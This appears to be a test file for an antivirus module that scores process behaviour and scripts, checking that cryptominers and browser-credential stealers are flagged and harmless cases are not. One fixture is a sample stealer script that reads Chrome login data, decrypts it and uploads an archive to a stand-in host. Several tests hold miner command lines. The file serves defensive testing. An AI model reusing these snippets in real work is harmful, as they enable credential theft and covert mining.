from src.antivir.behavior import assess_process_behavior, assess_stealer_script


def test_known_miner_with_sustained_cpu_and_pool_connection_is_block_eligible():
    result = assess_process_behavior(
        process_name="xmrig.exe",
        process_path=r"C:\Users\tester\AppData\Roaming\xmrig\xmrig.exe",
        command_line="xmrig.exe --url stratum+tcp://pool.example:3333 --user wallet --algo rx/0",
        cpu_sustained=True,
        network_ports={3333},
    )

    assert result.category == "miner"
    assert result.score >= 80
    assert result.auto_block_eligible is True


def test_renamed_miner_requires_multiple_behavioral_signals():
    result = assess_process_behavior(
        process_name="update.exe",
        process_path=r"C:\Users\tester\AppData\Local\Temp\update.exe",
        command_line="update.exe --pool stratum+ssl://pool.example:5555 --wallet abc -a randomx",
        cpu_sustained=True,
        network_ports={5555},
    )

    assert result.category == "miner"
    assert result.score >= 80
    assert result.auto_block_eligible is True


def test_high_cpu_legitimate_process_is_not_enough_to_classify_a_miner():
    result = assess_process_behavior(
        process_name="render.exe",
        process_path=r"C:\Program Files\Renderer\render.exe",
        command_line="render.exe --project scene.blend",
        cpu_sustained=True,
        network_ports=set(),
    )

    assert result.score < 35
    assert result.auto_block_eligible is False


def test_miner_filename_alone_is_never_auto_blocked():
    result = assess_process_behavior(
        process_name="xmrig.exe",
        process_path=r"C:\Tools\xmrig.exe",
        command_line="xmrig.exe",
        cpu_sustained=False,
        network_ports=set(),
    )

    assert result.score < 80
    assert result.auto_block_eligible is False


def test_browser_cookie_collection_plus_decryption_and_exfiltration_is_high_risk():
    script = """
    db = sqlite3.connect(r"Chrome\\User Data\\Default\\Login Data")
    key = CryptUnprotectData(encrypted_key)
    requests.post("https://example.invalid/upload", data=archive)
    """
    result = assess_stealer_script(script)

    assert result.category == "stealer"
    assert result.score >= 80
    assert any("браузер" in reason.lower() for reason in result.reasons)


def test_single_browser_path_reference_is_not_enough_to_flag_a_script():
    result = assess_stealer_script('print("Chrome User Data")')

    assert result.score < 35
    assert result.auto_block_eligible is False
